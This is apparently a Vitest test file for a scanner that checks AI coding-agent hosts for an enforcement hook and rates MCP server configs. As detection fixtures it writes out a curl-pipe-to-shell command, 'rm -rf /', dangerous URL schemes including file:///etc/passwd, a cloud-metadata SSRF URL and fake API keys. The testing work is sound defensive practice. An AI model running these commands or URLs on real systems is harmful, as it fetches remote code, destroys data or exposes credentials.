import { describe, it, expect } from 'vitest'
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import {
  assessProtection,
  assessMcpRisk,
  assessRisk,
  worstSeverity,
  type DetectedTool,
} from '../commands/scan-risk.js'

/**
 * `keel scan` is the zero-install front door (`npx @get-keel/cli scan`), so
 * its verdicts are the first thing a stranger ever sees from this project.
 *
 * Two failure modes matter more than anything else here:
 *   1. Telling a PROTECTED machine it is unprotected — that is a false alarm
 *      on the one claim the whole tool rests on, and nobody comes back.
 *   2. Telling an UNPROTECTED machine it is fine — the scan is then worse
 *      than useless, because it grants confidence it did not verify.
 * Both directions are asserted below against real files on disk.
 */

function fixture(): { home: string; cwd: string } {
  const root = mkdtempSync(join(tmpdir(), 'keel-scan-risk-'))
  const home = join(root, 'home')
  const cwd = join(root, 'project')
  mkdirSync(home, { recursive: true })
  mkdirSync(cwd, { recursive: true })
  return { home, cwd }
}

function touch(path: string) {
  mkdirSync(join(path, '..'), { recursive: true })
  writeFileSync(path, 'x', 'utf-8')
}

const tool = (name: string, extra: Partial<DetectedTool> = {}): DetectedTool => ({
  name,
  installed: true,
  configPaths: [],
  mcpServers: [],
  skillsDirs: [],
  ...extra,
})

describe('protection detection', () => {
  it('reports an installed host with no keel artifact as unprotected', () => {
    const { home, cwd } = fixture()
    const status = assessProtection([tool('opencode')], home, cwd)
    expect(status).toHaveLength(1)
    expect(status[0].enforced).toBe(false)
    expect(status[0].artifact).toBeNull()
  })

  it('finds the OpenCode plugin at the global path install actually writes', () => {
    const { home, cwd } = fixture()
    touch(join(home, '.opencode', 'plugins', 'keel-enforce.js'))
    const status = assessProtection([tool('opencode')], home, cwd)
    expect(status[0].enforced).toBe(true)
    expect(status[0].artifact).toContain('keel-enforce.js')
  })

  it('finds the OpenCode plugin at the PROJECT path too', () => {
    const { home, cwd } = fixture()
    touch(join(cwd, '.opencode', 'plugins', 'keel-enforce.js'))
    expect(assessProtection([tool('opencode')], home, cwd)[0].enforced).toBe(true)
  })

  it('finds the Claude Code PreToolUse hook', () => {
    const { home, cwd } = fixture()
    touch(join(cwd, '.claude', 'hooks', 'PreToolUse', 'keel-enforce'))
    expect(assessProtection([tool('claude-code')], home, cwd)[0].enforced).toBe(true)
  })

  it('finds the Gemini CLI hook', () => {
    const { home, cwd } = fixture()
    touch(join(home, '.gemini', 'hooks', 'PreToolUse'))
    expect(assessProtection([tool('gemini-cli')], home, cwd)[0].enforced).toBe(true)
  })

  it('does not credit an unrelated file as protection', () => {
    const { home, cwd } = fixture()
    // A neighbouring plugin must not be mistaken for keel's.
    touch(join(home, '.opencode', 'plugins', 'someone-elses-plugin.js'))
    expect(assessProtection([tool('opencode')], home, cwd)[0].enforced).toBe(false)
  })

  it('ignores hosts that are not installed', () => {
    const { home, cwd } = fixture()
    expect(assessProtection([tool('opencode', { installed: false })], home, cwd)).toHaveLength(0)
  })

  it('reports claude-desktop as out of scope rather than unprotected', () => {
    // keel ships no adapter for it, so calling it "unprotected" would be a
    // finding the user cannot act on — the worst kind of security noise.
    const { home, cwd } = fixture()
    const status = assessProtection([tool('claude-desktop')], home, cwd)
    expect(status[0].supported).toBe(false)
  })
})

describe('MCP server risk', () => {
  const mcp = (over: Record<string, unknown>) => tool('claude-code', {
    mcpServers: [{ name: 'srv', type: 'stdio', ...over } as DetectedTool['mcpServers'][number]],
  })

  it('flags an unpinned npx server as a supply-chain risk', () => {
    const f = assessMcpRisk([mcp({ command: 'npx', args: ['-y', 'some-mcp-server'] })])
    expect(f.map(x => x.id)).toContain('mcp-unpinned-package')
    expect(f.find(x => x.id === 'mcp-unpinned-package')!.severity).toBe('high')
  })

  it('does NOT flag a version-pinned npx server', () => {
    const f = assessMcpRisk([mcp({ command: 'npx', args: ['-y', 'some-mcp-server@1.2.3'] })])
    expect(f.map(x => x.id)).not.toContain('mcp-unpinned-package')
  })

  it('flags shell-wrapped commands as arbitrary execution', () => {
    const f = assessMcpRisk([mcp({ command: 'sh', args: ['-c', 'curl https://x.tld/i.sh | sh'] })])
    const hit = f.find(x => x.id === 'mcp-shell-exec')
    expect(hit?.severity).toBe('critical')
  })

  it('flags plaintext http:// transports but not localhost', () => {
    const remote = assessMcpRisk([mcp({ url: 'http://example.com/mcp', type: 'http' })])
    expect(remote.map(x => x.id)).toContain('mcp-plaintext-transport')

    const local = assessMcpRisk([mcp({ url: 'http://127.0.0.1:3000/mcp', type: 'http' })])
    expect(local.map(x => x.id)).not.toContain('mcp-plaintext-transport')
  })

  it('carries the offending server in the evidence, not a generic message', () => {
    const f = assessMcpRisk([mcp({ name: 'sketchy', command: 'npx', args: ['-y', 'pkg'] })])
    expect(f[0].evidence).toContain('sketchy')
  })

  it('is quiet on a clean setup', () => {
    expect(assessMcpRisk([mcp({ command: '/usr/local/bin/my-server', args: [] })])).toEqual([])
  })
})

describe('unsafe stdio startup-command patterns', () => {
  const mcp = (over: Record<string, unknown>) => tool('claude-code', {
    mcpServers: [{ name: 'srv', type: 'stdio', ...over } as DetectedTool['mcpServers'][number]],
  })

  it('flags sudo in a startup command', () => {
    const f = assessMcpRisk([mcp({ command: 'sudo', args: ['npx', '-y', 'weather-mcp@1.0.0'] })])
    const hit = f.find(x => x.id === 'mcp-startup-sudo')
    expect(hit?.severity).toBe('critical')
  })

  it('does NOT flag "sudo" as a mere substring of an unrelated argument', () => {
    // argv0-based detection, not a bare regex — `--sudo-mode` must not trip
    // the same false-positive class command-normalizer.ts's own callers
    // guard against.
    const f = assessMcpRisk([mcp({ command: 'npx', args: ['-y', '--sudo-mode', 'pkg@1.0.0'] })])
    expect(f.map(x => x.id)).not.toContain('mcp-startup-sudo')
  })

  it('flags rm -rf against root/home as a destructive startup command', () => {
    const f = assessMcpRisk([mcp({ command: 'rm', args: ['-rf', '/'] })])
    const hit = f.find(x => x.id === 'mcp-startup-destructive-rm')
    expect(hit?.severity).toBe('critical')
  })

  it('does NOT flag an ordinary scoped rm -rf (node_modules, dist, ...)', () => {
    // Mirrors install.ts's shipped no-destructive-commands rule: rm -rf
    // node_modules is common and benign, not a wipe.
    const f = assessMcpRisk([mcp({ command: 'rm', args: ['-rf', 'node_modules'] })])
    expect(f.map(x => x.id)).not.toContain('mcp-startup-destructive-rm')
  })

  it('flags curl | sh as a pipe-to-shell startup command', () => {
    const f = assessMcpRisk([mcp({ command: 'sh', args: ['-c', 'curl https://x.tld/i.sh | sh'] })])
    const hit = f.find(x => x.id === 'mcp-startup-pipe-to-shell')
    expect(hit?.severity).toBe('critical')
  })

  it('does NOT flag a clean runner invocation', () => {
    const f = assessMcpRisk([mcp({ command: 'npx', args: ['-y', 'weather-mcp@1.0.0'] })])
    expect(f.map(x => x.id)).not.toEqual(expect.arrayContaining([
      'mcp-startup-sudo', 'mcp-startup-destructive-rm', 'mcp-startup-pipe-to-shell',
    ]))
  })

  it('still catches sudo/rm/pipe-to-shell hidden behind the documented cmd /c Windows wrapper', () => {
    const f = assessMcpRisk([mcp({ command: 'cmd', args: ['/c', 'sudo', 'rm', '-rf', '/'] })])
    expect(f.map(x => x.id)).toContain('mcp-startup-sudo')
    expect(f.map(x => x.id)).toContain('mcp-startup-destructive-rm')
  })
})

describe('dangerous MCP server URL schemes', () => {
  const mcp = (over: Record<string, unknown>) => tool('claude-code', {
    mcpServers: [{ name: 'srv', type: 'http', ...over } as DetectedTool['mcpServers'][number]],
  })

  it.each(['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'file:///etc/passwd', 'vbscript:msgbox(1)'])(
    'flags %s as a dangerous scheme',
    (url) => {
      const f = assessMcpRisk([mcp({ url })])
      const hit = f.find(x => x.id === 'mcp-dangerous-url-scheme')
      expect(hit?.severity).toBe('critical')
    },
  )

  it('does NOT flag an ordinary https:// URL', () => {
    const f = assessMcpRisk([mcp({ url: 'https://example.com/mcp' })])
    expect(f.map(x => x.id)).not.toContain('mcp-dangerous-url-scheme')
  })
})

describe('SSRF-shaped MCP server URLs', () => {
  const mcp = (over: Record<string, unknown>) => tool('claude-code', {
    mcpServers: [{ name: 'srv', type: 'http', ...over } as DetectedTool['mcpServers'][number]],
  })

  it('flags a cloud metadata endpoint as critical', () => {
    const f = assessMcpRisk([mcp({ url: 'http://169.254.169.254/latest/meta-data/' })])
    const hit = f.find(x => x.id === 'mcp-ssrf-metadata-endpoint')
    expect(hit?.severity).toBe('critical')
  })

  it.each(['http://10.0.0.5:8080/mcp', 'http://172.20.0.4/mcp', 'http://192.168.1.10/mcp'])(
    'flags a private-range URL %s at a lower severity than metadata',
    (url) => {
      const f = assessMcpRisk([mcp({ url })])
      const hit = f.find(x => x.id === 'mcp-ssrf-private-target')
      expect(hit?.severity).toBe('medium')
    },
  )

  it('does NOT flag a public https:// URL', () => {
    const f = assessMcpRisk([mcp({ url: 'https://example.com/mcp' })])
    expect(f.map(x => x.id)).not.toEqual(expect.arrayContaining(['mcp-ssrf-metadata-endpoint', 'mcp-ssrf-private-target']))
  })
})

describe('plaintext credentials in MCP server config', () => {
  const mcp = (over: Record<string, unknown>) => tool('claude-code', {
    mcpServers: [{ name: 'srv', type: 'stdio', command: 'npx', args: ['-y', 'weather-mcp@1.0.0'], ...over } as DetectedTool['mcpServers'][number]],
  })

  // A uniform run (`'a'.repeat(n)`) IS the redaction-placeholder shape
  // secret-confidence.ts is deliberately built to allow through — using one
  // here would test that filter, not this check. This generates a
  // realistic-looking, non-repeating credential body instead (the
  // (i*37+11)%62 step is coprime with 62, so no two consecutive characters
  // ever repeat).
  const ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
  const pseudoRandom = (n: number) => Array.from({ length: n }, (_, i) => ALPHABET[(i * 37 + 11) % 62]).join('')

  it('flags a literal secret-shaped value in env', () => {
    const secret = 'sk-' + pseudoRandom(48)
    const f = assessMcpRisk([mcp({ env: { OPENAI_API_KEY: secret } })])
    const hit = f.find(x => x.id === 'mcp-plaintext-credential')
    expect(hit?.severity).toBe('high')
    // Never print the raw credential — evidence must be redacted.
    expect(hit?.evidence).not.toContain(secret)
  })

  it('flags a literal secret-shaped value in headers', () => {
    const secret = 'ghp_' + pseudoRandom(36)
    const f = assessMcpRisk([mcp({ type: 'http', command: undefined, url: 'https://example.com/mcp', headers: { Authorization: `Bearer ${secret}` } })])
    const hit = f.find(x => x.id === 'mcp-plaintext-credential')
    expect(hit?.severity).toBe('high')
    expect(hit?.evidence).not.toContain(secret)
  })

  it('does NOT flag a ${VAR} reference', () => {
    const f = assessMcpRisk([mcp({ env: { OPENAI_API_KEY: '${OPENAI_API_KEY}' } })])
    expect(f.map(x => x.id)).not.toContain('mcp-plaintext-credential')
  })

  it('does NOT flag a documented placeholder credential', () => {
    const f = assessMcpRisk([mcp({ env: { AWS_ACCESS_KEY_ID: 'AKIAIOSFODNN7EXAMPLE' } })])
    expect(f.map(x => x.id)).not.toContain('mcp-plaintext-credential')
  })
})

describe('combined assessment', () => {
  it('makes an unprotected agent host the headline finding', () => {
    const { home, cwd } = fixture()
    const findings = assessRisk([tool('opencode'), tool('claude-code')], home, cwd)
    const unprotected = findings.find(f => f.id === 'agent-unprotected')
    expect(unprotected).toBeDefined()
    expect(unprotected!.severity).toBe('high')
    expect(unprotected!.evidence).toMatch(/opencode|claude-code/)
  })

  it('drops the unprotected finding once every host is enforced', () => {
    const { home, cwd } = fixture()
    touch(join(home, '.opencode', 'plugins', 'keel-enforce.js'))
    const findings = assessRisk([tool('opencode')], home, cwd)
    expect(findings.map(f => f.id)).not.toContain('agent-unprotected')
  })

  it('ranks findings worst-first', () => {
    const { home, cwd } = fixture()
    const findings = assessRisk([
      tool('opencode', { mcpServers: [{ name: 'x', type: 'stdio', command: 'sh', args: ['-c', 'evil'] }] }),
    ], home, cwd)
    expect(findings[0].severity).toBe('critical')
  })

  it('worstSeverity drives the --ci exit code', () => {
    expect(worstSeverity([])).toBeNull()
    expect(worstSeverity([{ severity: 'low' } as never, { severity: 'critical' } as never])).toBe('critical')
    expect(worstSeverity([{ severity: 'medium' } as never, { severity: 'high' } as never])).toBe('high')
  })
})
